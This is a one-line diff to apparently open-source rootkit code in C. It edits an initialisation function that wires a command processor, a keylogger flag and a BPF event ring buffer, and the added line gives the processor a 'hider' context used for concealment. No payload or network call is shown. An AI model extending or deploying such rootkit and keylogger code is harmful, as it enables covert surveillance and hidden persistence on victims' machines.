@@ -33,6 +33,7 @@ int rootkit_init(application_context_t *application_ctx, const char *exec_name) 
     application_ctx->command_processor_ctx.rootkit_running = &application_ctx->running;
     application_ctx->command_processor_ctx.keylogger_active =
         &application_ctx->keylogger_ctx.keylogger_active;
+    application_ctx->command_processor_ctx.hider_ctx = &application_ctx->hider_ctx;
 
     application_ctx->command_event_rb = ring_buffer__new(
         bpf_map__fd(application_ctx->skel->maps.events), command_processor_handle_received_command,
